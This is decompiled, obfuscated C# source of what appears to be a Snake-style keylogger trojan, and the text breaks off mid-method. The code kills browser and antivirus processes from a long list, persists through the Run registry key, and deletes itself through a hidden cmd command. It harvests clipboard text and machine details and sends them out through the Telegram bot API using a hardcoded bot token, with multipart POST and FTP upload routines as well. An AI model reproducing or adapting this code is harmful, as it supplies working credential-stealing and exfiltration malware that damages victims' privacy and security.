// Decompiled with JetBrains decompiler
// Type: اۨ@恁ߡ.Α�ǎŎ�
// Assembly: iJMJnUDAnLMGBkvrphkwZ, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8BCFE5CC-61DE-4CD2-8DAF-2FBF230839CD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-871a0b2fa5664bd5ed819edb7c037b81b2b552e4ab9eec6f87adbf32d51365ef.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml;
using اۨ\u0040恁ߡ;
using کأ\u002Dݝ\u005E;
using 丐Ī\uFFFDĪē;
using 䇹\u07B4\u00AB\uFFFD\u003B;

namespace اۨ\u0040恁ߡ
{
  [StandardModule]
  internal sealed class Α\uFFFDǎŎ\uFFFD
  {
    public static string ŲЮݝœ\uFFFD;
    public static string \u05C1z盀蠺̔;
    public static string kٕ꼺ЦŲ = ".txt";
    private static Process[] \u060CҚב㠰쐬 = Process.GetProcesses();
    private static string ϒmŧ̳鈟;
    private static string AƟzş2;
    public static string ᔖׁՕ뜸\uFFFD;
    private static string ջ\u07BBz꾯ɩ;
    private static Α\uFFFDǎŎ\uFFFD.KeyLogger Ŕ\u0089ג㹃Ɖ;
    private static StringBuilder ɮݶԌεױ;
    private static object \u0097ƌ\u002DΑë;
    private static object \u07B4\u0040Օٚٗ;
    private static object Ω\uFFFḎB\u003B;
    private static string \uFFFD\uFFFDҢ똛Ӥ;
    private static object 똛\uFFFD䕃A\uFFFD;
    private static string \u0032ņչ\uFFFD\u07B4;
    private static string \uFFFDʪջ\uFFFD鈟;
    private static string ĪƟ̮Юϱ;
    private static string åӛϘٵ\u26CA;
    private static string \uFFFD\uFFFDƚ\uFFFDz;
    private static string \uFFFDۨ\uFFFD쐬أ;
    private static string Ɖ\u03852թ\u0609;
    private static string Α븤\u060C\u00BEŲ;
    private static string ĂՄi\uFFFD\uFFFD;
    private static string ݝŴ\uFFFDϘϒ;
    private static string \uFFFDڿ\u26CAŲå;
    private static string ε\u00ABę2\uFFFD;
    public static string \uFFFDۚ\u2964꾯і;
    private static object 鈟㹃ا\u07B9ٷ;

    static Α\uFFFDǎŎ\uFFFD()
    {
      Α\uFFFDǎŎ\uFFFD.ל\uFFFDŴҟ泮 = new System.Windows.Forms.Timer();
      Α\uFFFDǎŎ\uFFFD.Ңľۨ\u003Bϱ = new System.Windows.Forms.Timer();
      Α\uFFFDǎŎ\uFFFD.Łٚ츠䕃؜ = new System.Windows.Forms.Timer();
      Α\uFFFDǎŎ\uFFFD.\u0032̀Ò\u00ABУ = new System.Windows.Forms.Timer();
      Α\uFFFDǎŎ\uFFFD.ή퓜\u05C9皍\uFFFD = new System.Windows.Forms.Timer();
      Α\uFFFDǎŎ\uFFFD.\uFFFDε똛ęٗ = new System.Windows.Forms.Timer();
      Α\uFFFDǎŎ\uFFFD.أלל\u058F\u058F = new System.Windows.Forms.Timer();
      Α\uFFFDǎŎ\uFFFD.\uFFFDגBۚٗ = new System.Windows.Forms.Timer();
      Α\uFFFDǎŎ\uFFFD.AƟzş2 = "$%TelegramDv$";
      Α\uFFFDǎŎ\uFFFD.ᔖׁՕ뜸\uFFFD = "";
      Α\uFFFDǎŎ\uFFFD.ջ\u07BBz꾯ɩ = "$#TheHashHere%&";
      Α\uFFFDǎŎ\uFFFD.ɮݶԌεױ = new StringBuilder();
      Α\uFFFDǎŎ\uFFFD.\u0097ƌ\u002DΑë = (object) "False";
      Α\uFFFDǎŎ\uFFFD.\u07B4\u0040Օٚٗ = (object) "False";
      Α\uFFFDǎŎ\uFFFD.Ω\uFFFḎB\u003B = (object) "False";
      Α\uFFFDǎŎ\uFFFD.\uFFFD\uFFFDҢ똛Ӥ = "z123456789";
      Α\uFFFDǎŎ\uFFFD.똛\uFFFD䕃A\uFFFD = (object) "ProtectTrue";
      Α\uFFFDǎŎ\uFFFD.\u0032ņչ\uFFFD\u07B4 = "False";
      Α\uFFFDǎŎ\uFFFD.\uFFFDʪջ\uFFFD鈟 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (" \r\n\r\nPC Name:" + Environment.MachineName), Operators.AddObject((object) "\r\nDate and Time: ", Α\uFFFDǎŎ\uFFFD.\u060C\uFFFD丐Օt())), Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject((object) "\r\nClient IP: ", Α\uFFFDǎŎ\uFFFD.\u0306ִ\uFFFD鈇ľ()), (object) "\r\n"), (object) "Country Name: "), Α\uFFFDǎŎ\uFFFD.\uFFFḎ\uFFFDk\uFFFD()), (object) "\r\n")));
      Α\uFFFDǎŎ\uFFFD.ĪƟ̮Юϱ = "";
      Α\uFFFDǎŎ\uFFFD.åӛϘٵ\u26CA = "";
      Α\uFFFDǎŎ\uFFFD.\uFFFD\uFFFDƚ\uFFFDz = "";
      Α\uFFFDǎŎ\uFFFD.\uFFFDۨ\uFFFD쐬أ = "";
      Α\uFFFDǎŎ\uFFFD.Ɖ\u03852թ\u0609 = "";
      Α\uFFFDǎŎ\uFFFD.Α븤\u060C\u00BEŲ = "";
      Α\uFFFDǎŎ\uFFFD.ĂՄi\uFFFD\uFFFD = "";
      Α\uFFFDǎŎ\uFFFD.ݝŴ\uFFFDϘϒ = "";
      Α\uFFFDǎŎ\uFFFD.\uFFFDڿ\u26CAŲå = "5171883538:AAEyFWuNh68SJNNpkDCQbviRgrklZA3K4Qs";
      Α\uFFFDǎŎ\uFFFD.ε\u00ABę2\uFFFD = "1376739206";
      Α\uFFFDǎŎ\uFFFD.鈟㹃ا\u07B9ٷ = (object) ("ZyiAEnXWZP" + new Random().Next().ToString());
    }

    public static System.Windows.Forms.Timer ל\uFFFDŴҟ泮
    {
      get => Α\uFFFDǎŎ\uFFFD.ӚٚՕΑ\u07B9;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(Α\uFFFDǎŎ\uFFFD.ƌ鈟\uFFFD\uFFFD\uFFFD);
        System.Windows.Forms.Timer ӛٚՕα1 = Α\uFFFDǎŎ\uFFFD.ӚٚՕΑ\u07B9;
        if (ӛٚՕα1 != null)
          ӛٚՕα1.Tick -= eventHandler;
        Α\uFFFDǎŎ\uFFFD.ӚٚՕΑ\u07B9 = value;
        System.Windows.Forms.Timer ӛٚՕα2 = Α\uFFFDǎŎ\uFFFD.ӚٚՕΑ\u07B9;
        if (ӛٚՕα2 == null)
          return;
        ӛٚՕα2.Tick += eventHandler;
      }
    }

    public static System.Windows.Forms.Timer Ңľۨ\u003Bϱ
    {
      get => Α\uFFFDǎŎ\uFFFD.tԜ\uFFFD̔Ԍ;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(Α\uFFFDǎŎ\uFFFD.\uFFFḎ盀ۣݶ);
        System.Windows.Forms.Timer tԜ̔Ԍ1 = Α\uFFFDǎŎ\uFFFD.tԜ\uFFFD̔Ԍ;
        if (tԜ̔Ԍ1 != null)
          tԜ̔Ԍ1.Tick -= eventHandler;
        Α\uFFFDǎŎ\uFFFD.tԜ\uFFFD̔Ԍ = value;
        System.Windows.Forms.Timer tԜ̔Ԍ2 = Α\uFFFDǎŎ\uFFFD.tԜ\uFFFD̔Ԍ;
        if (tԜ̔Ԍ2 == null)
          return;
        tԜ̔Ԍ2.Tick += eventHandler;
      }
    }

    public static System.Windows.Forms.Timer Łٚ츠䕃؜
    {
      get => Α\uFFFDǎŎ\uFFFD.ɇO\uFFFDå\uFFFD;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(Α\uFFFDǎŎ\uFFFD.УӓņWɢ);
        System.Windows.Forms.Timer ɇOÅ1 = Α\uFFFDǎŎ\uFFFD.ɇO\uFFFDå\uFFFD;
        if (ɇOÅ1 != null)
          ɇOÅ1.Tick -= eventHandler;
        Α\uFFFDǎŎ\uFFFD.ɇO\uFFFDå\uFFFD = value;
        System.Windows.Forms.Timer ɇOÅ2 = Α\uFFFDǎŎ\uFFFD.ɇO\uFFFDå\uFFFD;
        if (ɇOÅ2 == null)
          return;
        ɇOÅ2.Tick += eventHandler;
      }
    }

    public static System.Windows.Forms.Timer \u0032̀Ò\u00ABУ
    {
      get => Α\uFFFDǎŎ\uFFFD.\uFFFD꼺\uFFFD츠ި;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(Α\uFFFDǎŎ\uFFFD.ZҚ\u07B4ϱ\uFFFD);
        System.Windows.Forms.Timer 꼺츠ި1 = Α\uFFFDǎŎ\uFFFD.\uFFFD꼺\uFFFD츠ި;
        if (꼺츠ި1 != null)
          꼺츠ި1.Tick -= eventHandler;
        Α\uFFFDǎŎ\uFFFD.\uFFFD꼺\uFFFD츠ި = value;
        System.Windows.Forms.Timer 꼺츠ި2 = Α\uFFFDǎŎ\uFFFD.\uFFFD꼺\uFFFD츠ި;
        if (꼺츠ި2 == null)
          return;
        꼺츠ި2.Tick += eventHandler;
      }
    }

    [field: AccessedThroughProperty("kLLTIm")]
    public static System.Windows.Forms.Timer ή퓜\u05C9皍\uFFFD { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    public static System.Windows.Forms.Timer \uFFFDε똛ęٗ
    {
      get => Α\uFFFDǎŎ\uFFFD.Rɮ뫆ۚŧ;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(Α\uFFFDǎŎ\uFFFD.㹃kë\uFFFDב);
        System.Windows.Forms.Timer rɮ뫆ۚŧ1 = Α\uFFFDǎŎ\uFFFD.Rɮ뫆ۚŧ;
        if (rɮ뫆ۚŧ1 != null)
          rɮ뫆ۚŧ1.Tick -= eventHandler;
        Α\uFFFDǎŎ\uFFFD.Rɮ뫆ۚŧ = value;
        System.Windows.Forms.Timer rɮ뫆ۚŧ2 = Α\uFFFDǎŎ\uFFFD.Rɮ뫆ۚŧ;
        if (rɮ뫆ۚŧ2 == null)
          return;
        rɮ뫆ۚŧ2.Tick += eventHandler;
      }
    }

    public static System.Windows.Forms.Timer أלל\u058F\u058F
    {
      get => Α\uFFFDǎŎ\uFFFD.k\uD997\uDEBA\uFFFDҚ;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(Α\uFFFDǎŎ\uFFFD.\uFFFD\uFFFḐکܹ);
        System.Windows.Forms.Timer kҚ1 = Α\uFFFDǎŎ\uFFFD.k\uD997\uDEBA\uFFFDҚ;
        if (kҚ1 != null)
          kҚ1.Tick -= eventHandler;
        Α\uFFFDǎŎ\uFFFD.k\uD997\uDEBA\uFFFDҚ = value;
        System.Windows.Forms.Timer kҚ2 = Α\uFFFDǎŎ\uFFFD.k\uD997\uDEBA\uFFFDҚ;
        if (kҚ2 == null)
          return;
        kҚ2.Tick += eventHandler;
      }
    }

    [field: AccessedThroughProperty("ProHfutimer")]
    public static System.Windows.Forms.Timer \uFFFDגBۚٗ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    public static void \uFFFD\u2964ӛ߂Ś()
    {
      int num1;
      int num2;
      try
      {
label_2:
        ProjectData.ClearProjectError();
        num1 = -2;
label_3:
        int num3 = 2;
        int num4 = checked (Α\uFFFDǎŎ\uFFFD.\u060CҚב㠰쐬.Length - 1);
        int index = 0;
        goto label_8;
label_4:
        num3 = 3;
        if (Operators.CompareString(Strings.LCase(Α\uFFFDǎŎ\uFFFD.\u060CҚב㠰쐬[index].ProcessName), "chrome", false) != 0)
          goto label_6;
label_5:
        num3 = 5;
        Α\uFFFDǎŎ\uFFFD.\u060CҚב㠰쐬[index].Kill();
label_6:
label_7:
        num3 = 8;
        checked { ++index; }
label_8:
        if (index <= num4)
          goto label_4;
        else
          goto label_15;
label_10:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_2;
              case 2:
                goto label_3;
              case 3:
                goto label_4;
              case 4:
              case 6:
              case 7:
                goto label_6;
              case 5:
                goto label_5;
              case 8:
                goto label_7;
              case 9:
                goto label_15;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_10;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_15:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public static void \uFFFDЅ\uFFFDBC()
    {
      int num1;
      int num2;
      try
      {
label_2:
        ProjectData.ClearProjectError();
        num1 = -2;
label_3:
        int num3 = 2;
        int num4 = checked (Α\uFFFDǎŎ\uFFFD.\u060CҚב㠰쐬.Length - 1);
        int index = 0;
        goto label_8;
label_4:
        num3 = 3;
        if (Operators.CompareString(Strings.LCase(Α\uFFFDǎŎ\uFFFD.\u060CҚב㠰쐬[index].ProcessName), "firefox", false) != 0)
          goto label_6;
label_5:
        num3 = 5;
        Α\uFFFDǎŎ\uFFFD.\u060CҚב㠰쐬[index].Kill();
label_6:
label_7:
        num3 = 8;
        checked { ++index; }
label_8:
        if (index <= num4)
          goto label_4;
        else
          goto label_15;
label_10:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_2;
              case 2:
                goto label_3;
              case 3:
                goto label_4;
              case 4:
              case 6:
              case 7:
                goto label_6;
              case 5:
                goto label_5;
              case 8:
                goto label_7;
              case 9:
                goto label_15;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_10;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_15:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public static void ĂΑﾭ\uFFFḎ()
    {
      string[] strArray1 = new string[194]
      {
        "zlclient",
        "egui",
        "bdagent",
        "npfmsg",
        "olydbg",
        "anubis",
        "wireshark",
        "avastui",
        "_Avp32",
        "vsmon",
        "mbam",
        "keyscrambler",
        "_Avpcc",
        "_Avpm",
        "Ackwin32",
        "Outpost",
        "Anti-Trojan",
        "ANTIVIR",
        "Apvxdwin",
        "ATRACK",
        "Autodown",
        "Avconsol",
        "Ave32",
        "Avgctrl",
        "Avkserv",
        "Avnt",
        "Avp",
        "Avp32",
        "Avpcc",
        "Avpdos32",
        "Avpm",
        "Avptc32",
        "Avpupd",
        "Avsched32",
        "AVSYNMGR",
        "Avwin95",
        "Avwupd32",
        "Blackd",
        "Blackice",
        "Cfiadmin",
        "Cfiaudit",
        "Cfinet",
        "Cfinet32",
        "Claw95",
        "Claw95cf",
        "Cleaner",
        "Cleaner3",
        "Defwatch",
        "Dvp95",
        "Dvp95_0",
        "Ecengine",
        "Esafe",
        "Espwatch",
        "F-Agnt95",
        "Findviru",
        "Fprot",
        "F-Prot",
        "F-Prot95",
        "Fp-Win",
        "Frw",
        "F-Stopw",
        "Iamapp",
        "Iamserv",
        "Ibmasn",
        "Ibmavsp",
        "Icload95",
        "Icloadnt",
        "Icmon",
        "Icsupp95",
        "Icsuppnt",
        "Iface",
        "Iomon98",
        "Jedi",
        "Lockdown2000",
        "Lookout",
        "Luall",
        "MCAFEE",
        "Moolive",
        "Mpftray",
        "N32scanw",
        "NAVAPSVC",
        "NAVAPW32",
        "NAVLU32",
        "Navnt",
        "NAVRUNR",
        "Navw32",
        "Navwnt",
        "NeoWatch",
        "NISSERV",
        "Nisum",
        "Nmain",
        "Normist",
        "NORTON",
        "Nupgrade",
        "Nvc95",
        "Outpost",
        "Padmin",
        "Pavcl",
        "Pavsched",
        "Pavw",
        "PCCIOMON",
        "PCCMAIN",
        "Pccwin98",
        "Pcfwallicon",
        "Persfw",
        "POP3TRAP",
        "PVIEW95",
        "Rav7",
        "Rav7win",
        "Rescue",
        "Safeweb",
        "Scan32",
        "Scan95",
        "Scanpm",
        "Scrscan",
        "Serv95",
        "Smc",
        "SMCSERVICE",
        "Snort",
        "Sphinx",
        "Sweep95",
        "SYMPROXYSVC",
        "Tbscan",
        "Tca",
        "Tds2-98",
        "Tds2-Nt",
        "TermiNET",
        "Vet95",
        "Vettray",
        "Vscan40",
        "Vsecomr",
        "Vshwin32",
        "Vsstat",
        "Webscanx",
        "WEBTRAP",
        "Wfindv32",
        "Zonealarm",
        "LOCKDOWN2000",
        "RESCUE32",
        "LUCOMSERVER",
        "avgcc",
        "avgcc",
        "avgamsvr",
        "avgupsvc",
        "avgw",
        "avgcc32",
        "avgserv",
        "avgserv9",
        "avgserv9schedapp",
        "avgemc",
        "ashwebsv",
        "ashdisp",
        "ashmaisv",
        "ashserv",
        "aswUpdSv",
        "symwsc",
        "norton",
        "Norton Auto-Protect",
        "norton_av",
        "nortonav",
        "ccsetmgr",
        "ccevtmgr",
        "avadmin",
        "avcenter",
        "avgnt",
        "avguard",
        "avnotify",
        "avscan",
        "guardgui",
        "nod32krn",
        "nod32kui",
        "clamscan",
        "clamTray",
        "clamWin",
        "freshclam",
        "oladdin",
        "sigtool",
        "w9xpopen",
        "Wclose",
        "cmgrdian",
        "alogserv",
        "mcshield",
        "vshwin32",
        "avconsol",
        "vsstat",
        "avsynmgr",
        "avcmd",
        "avconfig",
        "licmgr",
        "sched",
        "preupd",
        "MsMpEng",
        "MSASCui",
        "Avira.Systray"
      };
      Process[] processes = Process.GetProcesses();
      int index1 = 0;
      while (index1 < processes.Length)
      {
        Process process = processes[index1];
        string[] strArray2 = strArray1;
        int index2 = 0;
        while (index2 < strArray2.Length)
        {
          string Right = strArray2[index2];
          if (Operators.CompareString(process.ProcessName, Right, false) == 0)
          {
            process.Kill();
            break;
          }
          checked { ++index2; }
        }
        checked { ++index1; }
      }
    }

    public static object \uFFFD\uFFFDɢ̱Π(string _param0)
    {
      if (Process.GetProcessesByName(_param0).Length > 0)
        Process.GetCurrentProcess().Kill();
      return (object) null;
    }

    public static object ʓ̆\uFFFDӤߟ(string _param0)
    {
      if (System.IO.File.Exists(_param0))
        Process.GetCurrentProcess().Kill();
      return (object) null;
    }

    public static string \u1CFCǎ\uD95F\uDF92A(string _param0)
    {
      SHA256 shA256 = SHA256.Create();
      FileStream inputStream = System.IO.File.OpenRead(_param0);
      inputStream.Position = 0L;
      byte[] hash = shA256.ComputeHash((Stream) inputStream);
      inputStream.Close();
      string str = "";
      int num = checked (hash.Length - 1);
      int index = 0;
      while (index <= num)
      {
        str += hash[index].ToString("X2");
        checked { ++index; }
      }
      return str.ToLower();
    }

    public static void ΩӚ\uFFFDt\u07FB()
    {
      try
      {
        Process.Start(new ProcessStartInfo()
        {
          Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath + "\"",
          WindowStyle = ProcessWindowStyle.Hidden,
          CreateNoWindow = true,
          FileName = "cmd.exe"
        });
        Environment.Exit(1);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [DllImport("kernel32", EntryPoint = "GetModuleFileNameA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int \u26CA\u0097å̀\u07B9(int _param0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1, int _param2);

    [DllImport("kernel32", EntryPoint = "ExitProcess", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int 뜸븤؜̱ٚ(uint _param0);

    [DllImport("kernel32", EntryPoint = "MoveFileExW", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int \uFFFD\uFFFDչ\uFFFDҭ([MarshalAs(UnmanagedType.LPTStr), In] string _param0, [MarshalAs(UnmanagedType.LPTStr), In] string _param1, long _param2);

    public static void 꾯̆ޤɢ쐬()
    {
    }

    public static void \uFFFD皍Wή恁(string _param0, string _param1)
    {
      try
      {
        Registry.CurrentUser.OpenSubKey("software\\microsoft\\windows\\currentversion\\run", true).SetValue(_param0, (object) _param1, RegistryValueKind.String);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static void 똛ϫЦ\uFFFDë(string _param0, string _param1, string _param2, string _param3)
    {
      try
      {
        WebClient webClient = new WebClient();
        Stream stream = (Stream) new MemoryStream();
        string str1 = "------------------------" + DateTime.Now.Ticks.ToString("x");
        webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + str1);
        string str2 = _param3;
        string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", (object) str1, (object) _param0, (object) _param1, (object) str2);
        byte[] bytes = webClient.Encoding.GetBytes(s);
        webClient.UploadData(_param2, "POST", bytes);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static void şCЦ丐\u0026(string _param0, string _param1, string _param2, string _param3)
    {
      try
      {
        WebClient webClient = new WebClient();
        Stream stream = (Stream) new MemoryStream();
        string str1 = "------------------------" + DateTime.Now.Ticks.ToString("x");
        webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + str1);
        string str2 = _param3;
        string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", (object) str1, (object) _param0, (object) _param1, (object) str2);
        byte[] bytes = webClient.Encoding.GetBytes(s);
        webClient.UploadData(_param2, "POST", bytes);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static void ӛ\uFFFD\uFFFD\u07BBÒ(
      string Ăi䕃㠰ᔖ,
      string _param1,
      string _param2,
      string _param3)
    {
      try
      {
        WebClient webClient = new WebClient();
        Stream stream = (Stream) new MemoryStream();
        string str1 = "------------------------" + DateTime.Now.Ticks.ToString("x");
        webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + str1);
        string str2 = _param3;
        string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", (object) str1, (object) Ăi䕃㠰ᔖ, (object) _param1, (object) str2);
        byte[] bytes = webClient.Encoding.GetBytes(s);
        webClient.UploadData(_param2, "POST", bytes);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static void ϱʪ븤œױ(byte[] _param0, string _param1, string _param2, string _param3)
    {
      try
      {
        WebClient webClient = new WebClient();
        string str1 = "------------------------" + DateTime.Now.Ticks.ToString("x");
        webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + str1);
        string str2 = webClient.Encoding.GetString(_param0);
        string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", (object) str1, (object) _param1, (object) _param2, (object) str2);
        byte[] bytes = webClient.Encoding.GetBytes(s);
        webClient.UploadData(_param3, "POST", bytes);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void A丐ꓞ\uFFFDі(string _param0, string _param1, string _param2)
    {
      try
      {
        string requestUriString = "https://api.telegram.org/bot" + _param0 + "/sendMessage?chat_id=" + _param1 + "&text=" + _param2;
        ServicePointManager.Expect100Continue = false;
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
        HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(requestUriString);
        string empty = string.Empty;
        try
        {
          using (Stream responseStream = httpWebRequest.GetResponse().GetResponseStream())
            new StreamReader(responseStream, Encoding.UTF8).ReadToEnd();
        }
        catch (WebException ex)
        {
          ProjectData.SetProjectError((Exception) ex);
          WebException webException = ex;
          empty = webException.Message.ToString();
          using (Stream responseStream = webException.Response.GetResponseStream())
            new StreamReader(responseStream, Encoding.GetEncoding("utf-8")).ReadToEnd();
          throw;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static string ƌŚ̮ٚƌ(string _param0, string _param1)
    {
      DESCryptoServiceProvider cryptoServiceProvider1 = new DESCryptoServiceProvider();
      MD5CryptoServiceProvider cryptoServiceProvider2 = new MD5CryptoServiceProvider();
      byte[] destinationArray = new byte[8];
      Array.Copy((Array) cryptoServiceProvider2.ComputeHash(Encoding.ASCII.GetBytes(_param1)), 0, (Array) destinationArray, 0, 8);
      cryptoServiceProvider1.Key = destinationArray;
      cryptoServiceProvider1.Mode = CipherMode.ECB;
      ICryptoTransform encryptor = cryptoServiceProvider1.CreateEncryptor();
      byte[] bytes = Encoding.ASCII.GetBytes(_param0);
      return Convert.ToBase64String(encryptor.TransformFinalBlock(bytes, 0, bytes.Length));
    }

    public static object ߡЮ\uFFFDɮި()
    {
      DriveInfo[] drives = DriveInfo.GetDrives();
      int index = 0;
      long num;
      while (index < drives.Length)
      {
        DriveInfo driveInfo = drives[index];
        if (driveInfo.IsReady)
          checked { num += driveInfo.TotalSize; }
        checked { ++index; }
      }
      return (object) (Conversions.ToString(checked ((long) Math.Round(unchecked ((double) num / 1048576.0 / 1024.0)))) + " GB");
    }

    public static object \u060C\uFFFD丐Օt() => (object) (Conversions.ToString(DateAndTime.Today) + " / " + Conversions.ToString(DateAndTime.TimeOfDay));

    public static object ôҟɢ\uFFFD\uFFFD() => (object) \u07B8\uF0B9Ųӛé.\u1CFC븤\uFFFD̲Ś.Info.OSFullName;

    public static object \uFFFDۨ퓜ۚ\u005E() => (object) \u07B8\uF0B9Ųӛé.\u1CFC븤\uFFFD̲Ś.Info.OSVersion;

    public static object Zޤ丐ٵʓ() => (object) string.Format("{0:f2} GB", (object) ((double) \u07B8\uF0B9Ųӛé.\u1CFC븤\uFFFD̲Ś.Info.TotalPhysicalMemory / 1073741824.0));

    public static object \u0306ִ\uFFFD鈇ľ()
    {
      WebClient webClient = new WebClient();
      webClient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR1.0.3705;)");
      string address = "http://checkip.dyndns.org/";
      IWebProxy systemWebProxy = WebRequest.GetSystemWebProxy();
      systemWebProxy.Credentials = (ICredentials) CredentialCache.DefaultNetworkCredentials;
      webClient.Proxy = systemWebProxy;
      Stream stream;
      try
      {
        stream = webClient.OpenRead(address);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      StreamReader streamReader = new StreamReader(stream);
      string end = streamReader.ReadToEnd();
      stream.Close();
      streamReader.Close();
      return (object) end.Replace("<html><head><title>Current IP Check</title></head><body>", "").Replace("</body></html>", "").Replace("Current IP Address: ", "").ToString();
    }

    public static object \uFFFḎ\uFFFDk\uFFFD()
    {
      XmlDocument Instance = new XmlDocument();
      object obj = Operators.AddObject((object) "https://freegeoip.app/xml/", Α\uFFFDǎŎ\uFFFD.\u0306ִ\uFFFD鈇ľ());
      object[] objArray;
      bool[] flagArray;
      NewLateBinding.LateCall((object) Instance, (System.Type) null, "Load", objArray = new object[1]
      {
        obj
      }, (string[]) null, (System.Type[]) null, flagArray = new bool[1]
      {
        true
      }, true);
      if (flagArray[0])
        RuntimeHelpers.GetObjectValue(objArray[0]);
      XmlNodeList elementsByTagName = Instance.GetElementsByTagName("CountryName");
      string str = "";
      try
      {
        foreach (XmlElement xmlElement in elementsByTagName)
          str = xmlElement.InnerText;
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
      return (object) str;
    }

    public static byte[] å퓜\uFFFDׁ2() => Encoding.Unicode.GetBytes("Clipboard | " + Environment.UserName + " | Snake\r\n" + Α\uFFFDǎŎ\uFFFD.\uFFFDʪջ\uFFFD鈟 + "\r\n\r\n\r\n" + Α\uFFFDǎŎ\uFFFD.ᔖׁՕ뜸\uFFFD + "\r\n\r\n--------------------------------------------------");

    public static void УӓņWɢ(object _param0, EventArgs _param1)
    {
      if (Α\uFFFDǎŎ\uFFFD.ᔖׁՕ뜸\uFFFD.ToString().Contains(\u07B8\uF0B9Ųӛé.\u1CFC븤\uFFFD̲Ś.Clipboard.GetText().Replace(".", "<.>").Replace("http", "<http>")))
        return;
      Α\uFFFDǎŎ\uFFFD.ᔖׁՕ뜸\uFFFD = Α\uFFFDǎŎ\uFFFD.ᔖׁՕ뜸\uFFFD + \u07B8\uF0B9Ųӛé.\u1CFC븤\uFFFD̲Ś.Clipboard.GetText().Replace(".", "<.>").Replace("http", "<http>") + "\r\n";
    }

    public static void ZҚ\u07B4ϱ\uFFFD(object _param0, EventArgs _param1)
    {
      if (Operators.CompareString(Α\uFFFDǎŎ\uFFFD.AƟzş2, "%FTPDV$", false) == 0)
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
